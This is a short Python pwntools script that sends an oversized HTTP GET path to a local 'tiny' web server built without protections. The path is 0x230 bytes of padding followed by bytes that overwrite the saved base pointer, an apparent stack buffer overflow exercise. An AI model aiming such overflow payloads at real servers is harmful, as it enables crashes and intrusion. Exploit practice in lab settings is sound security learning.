from IPython import embed
from pwn import *
import sys, subprocess
import re

context.terminal = ['tmux', 'splitw', '-h']

ADDR = "127.0.0.1"
PORT = 9999
local_file = './tiny' # no protections

def http_request_bytes(path):
    return b"".join([
        b"GET ", path, b" HTTP/1.1\r\n",
        f"Host: {ADDR}:{PORT}\r\n".encode(),
        b"User-Agent: Hacker\r\n",
        b"\r\n"
        ])

def run_expl():
    p = remote(ADDR, PORT)
    # p.clean()
    
    padding_size = 0x230 # tiny no-protections

    # buffer overflow
    expl = b''
    expl += b'a'*(padding_size) #padding
    expl += b"\x01\x02\x03\x04bbbb" #override rbp

    http_req = http_request_bytes(expl)

    p.send(http_req)
    print(http_req)
    out = p.clean()
    print(out)
    p.close()

run_expl()
